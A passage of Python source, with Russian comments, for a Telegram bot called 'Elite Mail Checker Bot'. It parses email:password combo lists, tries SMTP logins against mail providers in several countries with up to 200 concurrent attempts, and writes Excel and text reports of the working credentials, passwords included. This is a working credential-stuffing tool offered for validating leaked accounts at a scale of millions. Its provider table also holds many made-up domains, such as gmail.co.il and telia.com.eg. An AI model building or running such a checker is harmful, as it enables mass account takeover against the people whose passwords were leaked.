    'bredband.net': {'host': 'smtp.bredband.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Sweden'},
    'algonet.se': {'host': 'smtp.algonet.se', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Sweden'},
    'swipnet.se': {'host': 'smtp.swipnet.se', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Sweden'},
    'tripnet.se': {'host': 'smtp.tripnet.se', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Sweden'},
    'glocalnet.net': {'host': 'smtp.glocalnet.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Sweden'},
    
    # Финские (10)
    'suomi24.fi': {'host': 'smtp.suomi24.fi', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Finland'},
    'kolumbus.fi': {'host': 'smtp.kolumbus.fi', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Finland'},
    'saunalahti.fi': {'host': 'smtp.saunalahti.fi', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Finland'},
    'elisa.fi': {'host': 'smtp.elisa.fi', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Finland'},
    'dnainternet.fi': {'host': 'smtp.dnainternet.fi', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Finland'},
    'surffi.fi': {'host': 'smtp.surffi.fi', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Finland'},
    'kympele.fi': {'host': 'smtp.kympele.fi', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Finland'},
    'pp.inet.fi': {'host': 'smtp.pp.inet.fi', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Finland'},
    'nic.fi': {'host': 'smtp.nic.fi', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Finland'},
    'kotinet.fi': {'host': 'smtp.kotinet.fi', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Finland'},
    
    # Датские (10)
    'mail.dk': {'host': 'smtp.mail.dk', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Denmark'},
    'post.tele.dk': {'host': 'smtp.post.tele.dk', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Denmark'},
    'yahoo.dk': {'host': 'smtp.mail.yahoo.dk', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Denmark'},
    'hotmail.dk': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Denmark'},
    'gmail.dk': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Denmark'},
    'outlook.dk': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Denmark'},
    'live.dk': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Denmark'},
    'msn.dk': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Denmark'},
    'mail2.dk': {'host': 'smtp.mail2.dk', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Denmark'},
    'email.dk': {'host': 'smtp.email.dk', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Denmark'},
    
    # Норвежские (10)
    'online.no': {'host': 'smtp.online.no', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Norway'},
    'hotmail.no': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Norway'},
    'gmail.no': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Norway'},
    'outlook.no': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Norway'},
    'live.no': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Norway'},
    'msn.no': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Norway'},
    'mail2.no': {'host': 'smtp.mail2.no', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Norway'},
    'email.no': {'host': 'smtp.email.no', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Norway'},
    'post.no': {'host': 'smtp.post.no', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Norway'},
    'telia.no': {'host': 'smtp.telia.no', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Norway'},
    
    # Израильские (10)
    'walla.co.il': {'host': 'smtp.walla.co.il', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Israel'},
    'yahoo.co.il': {'host': 'smtp.mail.yahoo.co.il', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Israel'},
    'hotmail.co.il': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Israel'},
    'gmail.co.il': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Israel'},
    'outlook.co.il': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Israel'},
    '012.net.il': {'host': 'smtp.012.net.il', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Israel'},
    'netvision.net.il': {'host': 'smtp.netvision.net.il', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Israel'},
    'bezeqint.net': {'host': 'smtp.bezeqint.net', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Israel'},
    'zahav.net.il': {'host': 'smtp.zahav.net.il', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Israel'},
    'smile.net.il': {'host': 'smtp.smile.net.il', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Israel'},
    
    # Египетские (10)
    'yahoo.com.eg': {'host': 'smtp.mail.yahoo.com.eg', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Egypt'},
    'hotmail.com.eg': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Egypt'},
    'gmail.com.eg': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Egypt'},
    'outlook.com.eg': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Egypt'},
    'live.com.eg': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Egypt'},
    'msn.com.eg': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Egypt'},
    'mail.com.eg': {'host': 'smtp.mail.com.eg', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Egypt'},
    'email.com.eg': {'host': 'smtp.email.com.eg', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Egypt'},
    'post.com.eg': {'host': 'smtp.post.com.eg', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Egypt'},
    'telia.com.eg': {'host': 'smtp.telia.com.eg', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Egypt'},
    
    # Южноафриканские (10)
    'yahoo.co.za': {'host': 'smtp.mail.yahoo.co.za', 'port': 587, 'ssl': False, 'tls': True, 'category': 'South Africa'},
    'hotmail.co.za': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'South Africa'},
    'gmail.co.za': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'South Africa'},
    'outlook.co.za': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'South Africa'},
    'live.co.za': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'South Africa'},
    'msn.co.za': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'South Africa'},
    'mail.co.za': {'host': 'smtp.mail.co.za', 'port': 587, 'ssl': False, 'tls': True, 'category': 'South Africa'},
    'email.co.za': {'host': 'smtp.email.co.za', 'port': 587, 'ssl': False, 'tls': True, 'category': 'South Africa'},
    'post.co.za': {'host': 'smtp.post.co.za', 'port': 587, 'ssl': False, 'tls': True, 'category': 'South Africa'},
    'telia.co.za': {'host': 'smtp.telia.co.za', 'port': 587, 'ssl': False, 'tls': True, 'category': 'South Africa'},
    
    # Австралийские (10)
    'yahoo.com.au': {'host': 'smtp.mail.yahoo.com.au', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Australia'},
    'hotmail.com.au': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Australia'},
    'gmail.com.au': {'host': 'smtp.gmail.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Australia'},
    'outlook.com.au': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Australia'},
    'live.com.au': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Australia'},
    'msn.com.au': {'host': 'smtp.office365.com', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Australia'},
    'mail.com.au': {'host': 'smtp.mail.com.au', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Australia'},
    'email.com.au': {'host': 'smtp.email.com.au', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Australia'},
    'post.com.au': {'host': 'smtp.post.com.au', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Australia'},
    'telia.com.au': {'host': 'smtp.telia.com.au', 'port': 587, 'ssl': False, 'tls': True, 'category': 'Australia'},
}

# ========== КЛАССЫ ДЛЯ ПРОВЕРКИ ==========
class CheckResult(Enum):
    VALID = "✅ ВАЛИД"
    INVALID = "❌ НЕВАЛИД"
    UNKNOWN_DOMAIN = "🌐 НЕИЗВЕСТНЫЙ ДОМЕН"
    SMTP_ERROR = "⚠️ ОШИБКА SMTP"
    TIMEOUT = "⏱️ ТАЙМАУТ"
    AUTH_ERROR = "🔐 ОШИБКА АВТОРИЗАЦИИ"

@dataclass
class EmailAccount:
    email: str
    password: str
    domain: str
    status: CheckResult = CheckResult.INVALID
    response_time: float = 0.0
    error_message: str = ""
    checked_at: str = ""
    smtp_info: Dict = field(default_factory=dict)
    
    def to_dict(self):
        return {
            "email": self.email,
            "password": self.password,
            "domain": self.domain,
            "status": self.status.value,
            "response_time": round(self.response_time, 2),
            "error_message": self.error_message,
            "checked_at": self.checked_at,
            "smtp_server": self.smtp_info.get("host", ""),
            "smtp_port": self.smtp_info.get("port", ""),
            "ssl_enabled": self.smtp_info.get("ssl", False),
            "tls_enabled": self.smtp_info.get("tls", False),
            "category": self.smtp_info.get("category", "")
        }

# ========== МЕНЕДЖЕР ПРОВЕРКИ ==========
class SMTPChecker:
    def __init__(self, max_concurrent=100):
        self.max_concurrent = max_concurrent
        self.semaphore = asyncio.Semaphore(max_concurrent)
        
    async def check_account(self, account: EmailAccount) -> EmailAccount:
        """Проверка одного аккаунта через SMTP"""
        account.checked_at = datetime.now().isoformat()
        
        # Получаем SMTP конфигурацию для домена
        smtp_config = SMTP_CONFIGS.get(account.domain.lower())
        if not smtp_config:
            account.status = CheckResult.UNKNOWN_DOMAIN
            account.error_message = f"Домен не поддерживается: {account.domain}"
            return account
        
        account.smtp_info = smtp_config.copy()
        
        try:
            start_time = asyncio.get_event_loop().time()
            
            async with self.semaphore:
                # Создаем SMTP клиент
                smtp = aiosmtplib.SMTP(
                    hostname=smtp_config['host'],
                    port=smtp_config['port'],
                    timeout=10,
                    use_tls=smtp_config['tls']
                )
                
                # Подключаемся
                await smtp.connect()
                
                # Если требуется SSL
                if smtp_config.get('ssl', False):
                    context = ssl.create_default_context()
                    await smtp.starttls(context=context)
                
                # Пробуем залогиниться
                try:
                    await smtp.login(account.email, account.password)
                    account.status = CheckResult.VALID
                    account.error_message = "Успешная авторизация"
                    
                except aiosmtplib.SMTPAuthenticationError as e:
                    account.status = CheckResult.AUTH_ERROR
                    account.error_message = f"Ошибка авторизации: {str(e)}"
                    
                except Exception as e:
                    account.status = CheckResult.SMTP_ERROR
                    account.error_message = f"SMTP ошибка: {str(e)}"
                
                # Закрываем соединение
                await smtp.quit()
                
                end_time = asyncio.get_event_loop().time()
                account.response_time = end_time - start_time
                
        except asyncio.TimeoutError:
            account.status = CheckResult.TIMEOUT
            account.error_message = "Таймаут подключения"
            
        except Exception as e:
            account.status = CheckResult.SMTP_ERROR
            account.error_message = f"Ошибка: {str(e)}"
        
        return account
    
    async def check_batch(self, accounts: List[EmailAccount]) -> List[EmailAccount]:
        """Проверка партии аккаунтов"""
        tasks = []
        for account in accounts:
            task = asyncio.create_task(self.check_account(account))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Обрабатываем результаты
        checked_accounts = []
        for result in results:
            if isinstance(result, Exception):
                logger.error(f"Ошибка при проверке: {result}")
                continue
            checked_accounts.append(result)
        
        return checked_accounts

# ========== ПАРСЕР ФАЙЛОВ ==========
class FileParser:
    @staticmethod
    def parse_text(text: str) -> List[EmailAccount]:
        """Парсинг текста с аккаунтами"""
        accounts = []
        lines = text.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
                
            # Поддерживаемые форматы:
            # email:password
            # email;password
            # email|password
            # email password
            # email\tpassword
            
            email = ""
            password = ""
            
            # Определяем разделитель
            if ':' in line:
                parts = line.split(':', 1)
            elif ';' in line:
                parts = line.split(';', 1)
            elif '|' in line:
                parts = line.split('|', 1)
            elif '\t' in line:
                parts = line.split('\t', 1)
            else:
                # Пробуем разделить по пробелу
                parts = line.split(' ', 1)
                if len(parts) < 2:
                    continue
            
            if len(parts) >= 2:
                email = parts[0].strip()
                password = parts[1].strip()
                
                # Проверяем валидность email
                if '@' in email:
                    domain = email.split('@')[1].lower()
                    account = EmailAccount(email=email, password=password, domain=domain)
                    accounts.append(account)
        
        return accounts
    
    @staticmethod
    async def parse_file(file_path: str) -> List[EmailAccount]:
        """Парсинг файла с аккаунтами"""
        accounts = []
        
        try:
            async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
                accounts = FileParser.parse_text(content)
                
        except Exception as e:
            logger.error(f"Ошибка чтения файла: {e}")
            
        return accounts

# ========== ГЕНЕРАТОР ОТЧЕТОВ ==========
class ReportGenerator:
    @staticmethod
    def generate_excel(accounts: List[EmailAccount], filename: str):
        """Генерация Excel отчета"""
        wb = openpyxl.Workbook()
        ws = wb.active
        ws.title = "Результаты проверки"
        
        # Заголовки
        headers = [
            "Email", "Пароль", "Домен", "Статус", 
            "Время ответа (сек)", "Ошибка", "Проверено",
            "SMTP Сервер", "Порт", "SSL", "TLS", "Категория"
        ]
        
        for col, header in enumerate(headers, 1):
            cell = ws.cell(row=1, column=col, value=header)
            cell.font = Font(bold=True)
            cell.fill = PatternFill(start_color="366092", end_color="366092", fill_type="solid")
            cell.font = Font(color="FFFFFF", bold=True)
            cell.alignment = Alignment(horizontal="center")
        
        # Данные
        for row, account in enumerate(accounts, 2):
            data = account.to_dict()
            ws.cell(row=row, column=1, value=data["email"])
            ws.cell(row=row, column=2, value=data["password"])
            ws.cell(row=row, column=3, value=data["domain"])
            
            # Статус с цветом
            status_cell = ws.cell(row=row, column=4, value=data["status"])
            if "ВАЛИД" in data["status"]:
                status_cell.fill = PatternFill(start_color="C6EFCE", end_color="C6EFCE", fill_type="solid")
            elif "НЕВАЛИД" in data["status"]:
                status_cell.fill = PatternFill(start_color="FFC7CE", end_color="FFC7CE", fill_type="solid")
            else:
                status_cell.fill = PatternFill(start_color="FFEB9C", end_color="FFEB9C", fill_type="solid")
            
            ws.cell(row=row, column=5, value=data["response_time"])
            ws.cell(row=row, column=6, value=data["error_message"])
            ws.cell(row=row, column=7, value=data["checked_at"])
            ws.cell(row=row, column=8, value=data["smtp_server"])
            ws.cell(row=row, column=9, value=data["smtp_port"])
            ws.cell(row=row, column=10, value="Да" if data["ssl_enabled"] else "Нет")
            ws.cell(row=row, column=11, value="Да" if data["tls_enabled"] else "Нет")
            ws.cell(row=row, column=12, value=data["category"])
        
        # Автоширина колонок
        for column in ws.columns:
            max_length = 0
            column_letter = get_column_letter(column[0].column)
            
            for cell in column:
                try:
                    if len(str(cell.value)) > max_length:
                        max_length = len(str(cell.value))
                except:
                    pass
            
            adjusted_width = min(max_length + 2, 50)
            ws.column_dimensions[column_letter].width = adjusted_width
        
        # Сохраняем файл
        wb.save(filename)
        return filename
    
    @staticmethod
    def generate_text_report(accounts: List[EmailAccount]) -> str:
        """Генерация текстового отчета"""
        report = []
        report.append("=" * 80)
        report.append("📊 ОТЧЕТ О ПРОВЕРКЕ ПОЧТОВЫХ АККАУНТОВ")
        report.append("=" * 80)
        
        # Статистика
        total = len(accounts)
        valid = sum(1 for a in accounts if a.status == CheckResult.VALID)
        invalid = sum(1 for a in accounts if a.status == CheckResult.INVALID)
        unknown = sum(1 for a in accounts if a.status == CheckResult.UNKNOWN_DOMAIN)
        errors = total - valid - invalid - unknown
        
        report.append(f"\n📈 СТАТИСТИКА:")
        report.append(f"   Всего аккаунтов: {total}")
        report.append(f"   ✅ Валидных: {valid} ({valid/total*100:.1f}%)")
        report.append(f"   ❌ Невалидных: {invalid} ({invalid/total*100:.1f}%)")
        report.append(f"   🌐 Неизвестных доменов: {unknown}")
        report.append(f"   ⚠️ Ошибок проверки: {errors}")
        
        # Группировка по доменам
        report.append(f"\n🏷️ ГРУППИРОВКА ПО ДОМЕНАМ:")
        domains = {}
        for account in accounts:
            if account.domain not in domains:
                domains[account.domain] = {"total": 0, "valid": 0}
            domains[account.domain]["total"] += 1
            if account.status == CheckResult.VALID:
                domains[account.domain]["valid"] += 1
        
        for domain, stats in list(domains.items())[:10]:  # Показываем топ-10
            valid_percent = stats["valid"]/stats["total"]*100 if stats["total"] > 0 else 0
            report.append(f"   {domain}: {stats['valid']}/{stats['total']} ({valid_percent:.1f}%)")
        
        if len(domains) > 10:
            report.append(f"   ... и еще {len(domains) - 10} доменов")
        
        # Детали по валидным аккаунтам
        report.append(f"\n✅ ВАЛИДНЫЕ АККАУНТЫ:")
        valid_accounts = [a for a in accounts if a.status == CheckResult.VALID]
        for i, account in enumerate(valid_accounts[:5], 1):
            report.append(f"   {i}. {account.email} (ответ: {account.response_time:.2f}сек)")
        
        if len(valid_accounts) > 5:
            report.append(f"   ... и еще {len(valid_accounts) - 5} аккаунтов")
        
        # Детали по ошибкам
        error_accounts = [a for a in accounts if a.status not in [CheckResult.VALID, CheckResult.INVALID]]
        if error_accounts:
            report.append(f"\n⚠️ АККАУНТЫ С ОШИБКАМИ:")
            for i, account in enumerate(error_accounts[:3], 1):
                report.append(f"   {i}. {account.email}: {account.status.value} - {account.error_message[:50]}")
            
            if len(error_accounts) > 3:
                report.append(f"   ... и еще {len(error_accounts) - 3} ошибок")
        
        report.append("\n" + "=" * 80)
        report.append(f"📅 Отчет сгенерирован: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("=" * 80)
        
        return "\n".join(report)

# ========== ТЕЛЕГРАМ БОТ ==========
class CheckerStates(StatesGroup):
    WAITING_FOR_FILE = State()
    WAITING_FOR_TEXT = State()
    CHECKING_IN_PROGRESS = State()

class EliteMailCheckerBot:
    def __init__(self, token: str):
        self.bot = Bot(token=token)
        self.dp = Dispatcher(storage=MemoryStorage())
        self.checker = SMTPChecker(max_concurrent=200)
        self.current_checks = {}
        self.setup_handlers()
        
        logger.info(f"Elite Mail Checker Bot v{VERSION} initialized")
    
    def setup_handlers(self):
        """Настройка обработчиков команд"""
        
        @self.dp.message(Command("start"))
        async def cmd_start(message: Message):
            welcome_text = f"""
🔥 *Elite Mail Checker Bot v{VERSION}*

*Профессиональный валидатор почтовых аккаунтов*
• Проверка через SMTP (авторизация)
• Поддержка 500+ доменов
• Мгновенная проверка миллионов аккаунтов
• Детальная статистика и отчеты

*Поддерживаемые форматы:*
• `email:password`
• `email;password`
• `email|password`
• `email password`
• Файлы: txt, csv

*Команды:*
▶️ /check - Начать проверку
📊 /stats - Статистика бота
⚙️ /settings - Настройки
❓ /help - Помощь
🏠 /domains - Список доменов

*Отправьте файл или текст с аккаунтами для проверки!*
            """
            
            await message.answer(
                welcome_text,
                parse_mode="Markdown",
                reply_markup=self.get_main_keyboard()
            )
        
        @self.dp.message(Command("check"))
        async def cmd_check(message: Message, state: FSMContext):
            await state.set_state(CheckerStates.WAITING_FOR_FILE)
            
            await message.answer(
                "📁 *Отправьте файл или текст с аккаунтами*\n\n"
                "*Формат:*\n"
                "```\n"
                "email:password\n"
                "email;password\n"
                "email|password\n"
                "email password\n"
                "```\n\n"
                "*Поддерживаемые файлы:* TXT, CSV\n"
                "*Максимум:* 1,000,000 аккаунтов\n\n"
                "Или просто отправьте текст с аккаунтами:",
                parse_mode="Markdown",
                reply_markup=self.get_check_keyboard()
            )
        
        @self.dp.message(Command("stats"))
        async def cmd_stats(message: Message):
            stats_text = f"""
📊 *Статистика бота*

*Системная информация:*
• Версия: {VERSION}
• Поддерживаемых доменов: {len(SMTP_CONFIGS)}
• Максимум одновременных проверок: {self.checker.max_concurrent}
• Активных проверок: {len(self.current_checks)}

*SMTP конфигурация:*
• Google: {len([d for d in SMTP_CONFIGS.values() if d.get('category') == 'Google'])} доменов
• Microsoft: {len([d for d in SMTP_CONFIGS.values() if d.get('category') == 'Microsoft'])} доменов
• Yandex: {len([d for d in SMTP_CONFIGS.values() if d.get('category') == 'Yandex'])} доменов
• MailRu: {len([d for d in SMTP_CONFIGS.values() if d.get('category') == 'MailRu'])} доменов
• Другие: {len([d for d in SMTP_CONFIGS.values() if d.get('category') not in ['Google', 'Microsoft', 'Yandex', 'MailRu']])} доменов

*Использование:*
• Отправьте /check для начала проверки
• Или отправьте файл с аккаунтами
            """
            
            await message.answer(stats_text, parse_mode="Markdown")
        
        @self.dp.message(Command("domains"))
        async def cmd_domains(message: Message):
            domains_text = "🏷️ *Поддерживаемые домены (топ-50):*\n\n"
            
            # Группируем по категориям
            categories = {}
            for domain, config in list(SMTP_CONFIGS.items())[:50]:
                category = config.get('category', 'Other')
                if category not in categories:
                    categories[category] = []
                categories[category].append(domain)
            
            for category, domains in categories.items():
                domains_text += f"*{category}:*\n"
                for domain in domains[:5]:
                    domains_text += f"• {domain}\n"
                if len(domains) > 5:
                    domains_text += f"  ... и еще {len(domains) - 5}\n"
                domains_text += "\n"
            
            domains_text += f"\n*Всего доменов: {len(SMTP_CONFIGS)}*"
            
            await message.answer(domains_text, parse_mode="Markdown")
        
        @self.dp.message(Command("help"))
        async def cmd_help(message: Message):
            help_text = """
